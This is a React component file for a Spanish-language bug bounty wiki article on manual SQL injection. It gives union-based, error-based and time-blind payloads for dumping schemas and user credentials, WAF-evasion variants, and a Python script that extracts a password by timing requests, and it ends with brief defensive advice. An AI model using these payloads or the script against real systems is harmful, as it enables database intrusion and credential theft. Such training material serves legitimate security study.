/**
 * SQL INJECTION MANUAL AVANZADA
 * Contenido del artículo separado en su propio archivo
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertSuccess,
  CodeBlock,
  ListItem
} from '@/components/WikiArticleComponents';
import { Database } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SqlInjectionAvanzadaContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="SQL Injection Manual: Más Allá de SQLMap">
        <Paragraph>
          Las herramientas automáticas como <Strong>SQLMap</Strong> son excelentes para encontrar vulnerabilidades 
          rápidamente, pero en entornos de Bug Bounty competitivos o aplicaciones bien protegidas, necesitas 
          <Strong> técnicas manuales avanzadas</Strong> que las herramientas no detectan.
        </Paragraph>

        <Paragraph>
          Esta guía cubre tres técnicas avanzadas de exfiltración manual:
        </Paragraph>

        <ul className="space-y-2 mt-4">
          <ListItem><Strong>Union-based SQLi:</Strong> Combinar consultas para extraer datos directamente</ListItem>
          <ListItem><Strong>Error-based SQLi:</Strong> Forzar errores verbosos que filtran información</ListItem>
          <ListItem><Strong>Time-blind SQLi:</Strong> Inferir datos mediante retrasos temporales</ListItem>
        </ul>
      </Section>

      <Section id="union-based" title="1. Union-based SQL Injection">
        <Paragraph>
          La técnica <Strong>UNION</Strong> permite combinar los resultados de dos consultas SELECT en una sola respuesta.
          Es la forma más directa de exfiltrar datos cuando la aplicación muestra resultados en pantalla.
        </Paragraph>

        <Subsection title="Paso 1: Detectar el Número de Columnas">
          <Paragraph>
            Antes de usar UNION, necesitas saber cuántas columnas devuelve la consulta original:
          </Paragraph>

          <CodeBlock
            language="sql"
            title="Detectar número de columnas con ORDER BY"
            code={`-- Prueba con ORDER BY incrementando hasta que falle
https://target.com/products?id=1 ORDER BY 1--
https://target.com/products?id=1 ORDER BY 2--
https://target.com/products?id=1 ORDER BY 3--
https://target.com/products?id=1 ORDER BY 4--  ❌ Error = 3 columnas

-- Alternativa con UNION SELECT NULL
https://target.com/products?id=1 UNION SELECT NULL--  ❌ Error
https://target.com/products?id=1 UNION SELECT NULL,NULL--  ❌ Error
https://target.com/products?id=1 UNION SELECT NULL,NULL,NULL--  ✅ Funciona = 3 columnas`}
          />
        </Subsection>

        <Subsection title="Paso 2: Identificar Columnas con Tipos de Datos Compatibles">
          <Paragraph>
            No todas las columnas aceptan strings. Identifica cuáles son compatibles:
          </Paragraph>

          <CodeBlock
            language="sql"
            title="Probar tipos de datos en cada columna"
            code={`-- Probar cada columna con un string
https://target.com/products?id=1 UNION SELECT 'a',NULL,NULL--
https://target.com/products?id=1 UNION SELECT NULL,'a',NULL--
https://target.com/products?id=1 UNION SELECT NULL,NULL,'a'--  ✅ Funciona

-- Si la columna acepta strings, podemos inyectar datos ahí`}
          />
        </Subsection>

        <Subsection title="Paso 3: Exfiltrar Datos de Interés">
          <CodeBlock
            language="sql"
            title="Extracción de datos sensibles"
            code={`-- Obtener versión de la base de datos
' UNION SELECT NULL,NULL,@@version--

-- Listar todas las bases de datos (MySQL)
' UNION SELECT NULL,NULL,schema_name FROM information_schema.schemata--

-- Listar tablas de una base de datos
' UNION SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='target_db'--

-- Listar columnas de una tabla
' UNION SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Extraer credenciales
' UNION SELECT NULL,username,password FROM users--

-- Concatenar múltiples columnas en una (cuando solo una columna es visible)
' UNION SELECT NULL,NULL,CONCAT(username,':',password) FROM users--`}
          />
        </Subsection>

        <AlertWarning title="Evasión de WAF">
          Si el WAF bloquea <InlineCode>UNION</InlineCode>, prueba:
          <ul className="mt-2 space-y-1">
            <ListItem><InlineCode>/*!UNION*/</InlineCode> (comentarios MySQL inline)</ListItem>
            <ListItem><InlineCode>UnIoN</InlineCode> (case mixing)</ListItem>
            <ListItem><InlineCode>UNION/**/SELECT</InlineCode> (espacios con comentarios)</ListItem>
          </ul>
        </AlertWarning>
      </Section>

      <Section id="error-based" title="2. Error-based SQL Injection">
        <Paragraph>
          Cuando la aplicación <Strong>no muestra resultados de SELECT</Strong> pero sí muestra errores SQL detallados,
          podemos forzar errores que filtren información en el mensaje de error.
        </Paragraph>

        <Subsection title="Técnica: ExtractValue (MySQL)">
          <CodeBlock
            language="sql"
            title="Exfiltración mediante errores XML"
            code={`-- Extraer versión de MySQL
' AND extractvalue(1,concat(0x7e,version()))--
-- Error: XPATH syntax error: '~5.7.33-0ubuntu0.18.04.1'

-- Extraer nombre de la base de datos actual
' AND extractvalue(1,concat(0x7e,database()))--
-- Error: XPATH syntax error: '~target_db'

-- Extraer primer usuario
' AND extractvalue(1,concat(0x7e,(SELECT username FROM users LIMIT 1)))--
-- Error: XPATH syntax error: '~admin'

-- Extraer contraseña del admin
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))--
-- Error: XPATH syntax error: '~$2y$10$abcd1234....'`}
          />
        </Subsection>

        <Subsection title="Técnica: UpdateXML (Alternativa)">
          <CodeBlock
            language="sql"
            title="Otra función XML para forzar errores"
            code={`-- Mismo concepto, diferente función
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--

-- Extraer todas las tablas (limitado por longitud de error)
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--`}
          />
        </Subsection>

        <AlertInfo title="Limitación de Longitud">
          Los mensajes de error tienen límite de caracteres (~32 en MySQL). Para exfiltrar datos largos:
          <ul className="mt-2 space-y-1">
            <ListItem>Usa <InlineCode>SUBSTRING()</InlineCode> para extraer en trozos</ListItem>
            <ListItem>Usa <InlineCode>LIMIT</InlineCode> para iterar sobre filas</ListItem>
          </ul>
        </AlertInfo>
      </Section>

      <Section id="time-blind" title="3. Time-blind SQL Injection">
        <Paragraph>
          La técnica más sigilosa pero lenta. Cuando la aplicación <Strong>no muestra ni resultados ni errores</Strong>,
          podemos inferir información mediante <Strong>retrasos temporales</Strong>.
        </Paragraph>

        <Subsection title="Concepto Básico">
          <CodeBlock
            language="sql"
            title="Inferir datos bit a bit mediante tiempo de respuesta"
            code={`-- Si la condición es TRUE, retrasa 5 segundos
' AND IF(1=1, SLEEP(5), 0)--  ⏱️ Respuesta en 5 segundos = TRUE
' AND IF(1=2, SLEEP(5), 0)--  ⏱️ Respuesta inmediata = FALSE

-- Verificar si existe la tabla 'users'
' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--

-- Verificar longitud del nombre de usuario admin
' AND IF((SELECT LENGTH(username) FROM users WHERE id=1)=5, SLEEP(5), 0)--

-- Extraer primer caracter del username (A=65 en ASCII)
' AND IF(ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=65, SLEEP(5), 0)--`}
          />
        </Subsection>

        <Subsection title="Script de Automatización (Python)">
          <CodeBlock
            language="python"
            title="exploit_time_blind.py"
            code={`import requests
import time
import string

url = "https://target.com/search"
charset = string.ascii_lowercase + string.digits + "_"

def check_char(position, char):
    """Verifica si el caracter en la posición coincide"""
    payload = f"' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{position},1))={ord(char)}, SLEEP(3), 0)--"
    
    start = time.time()
    requests.get(url, params={"q": payload}, timeout=10)
    elapsed = time.time() - start
    
    return elapsed > 3  # Si tardó más de 3 seg, el char es correcto

def extract_data(length=32):
    """Extrae dato caracter por caracter"""
    result = ""
    for i in range(1, length + 1):
        for char in charset:
            if check_char(i, char):
                result += char
                print(f"[+] Caracter {i}: {result}")
                break
    return result

# Primero detectar longitud
# Luego extraer caracter a caracter
password = extract_data(32)
print(f"[!] Password extraída: {password}")`}
          />
        </Subsection>

        <AlertDanger title="Limitaciones de Time-blind">
          <ul className="space-y-2 mt-2">
            <ListItem>
              <Strong>Muy lento:</Strong> Extraer 32 caracteres puede tomar horas
            </ListItem>
            <ListItem>
              <Strong>Detectable por IDS:</Strong> Miles de requests con delays sospechosos
            </ListItem>
            <ListItem>
              <Strong>Sensible a latencia de red:</Strong> Falsos positivos por lag
            </ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="comparacion" title="Comparación de Técnicas">
        <div className="overflow-x-auto">
          <table className="w-full border-collapse bg-white dark:bg-slate-800 rounded-xl overflow-hidden">
            <thead>
              <tr className="bg-slate-100 dark:bg-slate-700">
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Técnica</th>
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Velocidad</th>
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Stealth</th>
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Requisitos</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-200 dark:divide-slate-700">
              <tr>
                <td className="p-4"><Strong>Union-based</Strong></td>
                <td className="p-4 text-green-600 dark:text-green-400">⚡ Muy rápida</td>
                <td className="p-4 text-red-600 dark:text-red-400">🔴 Muy detectable</td>
                <td className="p-4 text-slate-700 dark:text-slate-300">Resultados visibles en página</td>
              </tr>
              <tr>
                <td className="p-4"><Strong>Error-based</Strong></td>
                <td className="p-4 text-green-600 dark:text-green-400">⚡ Rápida</td>
                <td className="p-4 text-yellow-600 dark:text-yellow-400">🟡 Moderada</td>
                <td className="p-4 text-slate-700 dark:text-slate-300">Errores SQL verbosos</td>
              </tr>
              <tr>
                <td className="p-4"><Strong>Time-blind</Strong></td>
                <td className="p-4 text-red-600 dark:text-red-400">🐌 Muy lenta</td>
                <td className="p-4 text-green-600 dark:text-green-400">🟢 Menos detectable</td>
                <td className="p-4 text-slate-700 dark:text-slate-300">Ninguno (funciona siempre)</td>
              </tr>
            </tbody>
          </table>
        </div>
      </Section>

      <Section id="defensa" title="Cómo Defenderse">
        <AlertSuccess title="Mejores Prácticas">
          <ul className="space-y-2 mt-2">
            <ListItem>
              <Strong>Prepared Statements:</Strong> Usa SIEMPRE consultas parametrizadas (PDO, MySQLi, ORM)
            </ListItem>
            <ListItem>
              <Strong>Whitelist Validation:</Strong> Valida inputs contra lista permitida, no blacklist
            </ListItem>
            <ListItem>
              <Strong>Least Privilege:</Strong> Usuario de BD con permisos mínimos (no DBA)
            </ListItem>
            <ListItem>
              <Strong>Errores genéricos:</Strong> Nunca mostrar errores SQL detallados en producción
            </ListItem>
            <ListItem>
              <Strong>WAF:</Strong> Web Application Firewall con reglas anti-SQLi
            </ListItem>
          </ul>
        </AlertSuccess>
      </Section>

      {/* Siguiente artículo */}
      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente Tema</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/mongodb-injection`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <Database className="w-5 h-5" />
          <span>MongoDB Operator Injection</span>
        </Link>
      </div>
    </>
  );
}
